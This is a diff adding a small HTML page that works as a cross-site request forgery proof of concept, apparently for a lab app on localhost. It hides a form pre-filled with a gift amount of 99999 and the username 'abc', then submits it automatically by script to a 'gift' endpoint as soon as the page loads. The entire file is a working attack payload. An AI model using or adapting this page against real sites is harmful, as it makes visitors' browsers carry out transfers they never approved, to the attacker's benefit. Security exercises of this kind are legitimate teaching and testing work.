@@ -1,0 +1,15 @@
+<style>
+    .mb-4 {
+        display: none;
+    }
+</style>
+
+<form action="http://localhost:8000/gift/1" method="get">
+    <div class="mb-4">
+        <input type="text" class="form-control mb-2" name="amount" id="amount" placeholder="$0.00" , value="99999">
+        <input type="text" class="form-control mb-2" name="username" id="username" placeholder="Username" , value="abc">
+    </div>
+    <button class="btn btn-block" type="submit">Gift one</button>
+</form>
+
+<script> const form = document.querySelector("form"); form.submit() </script>
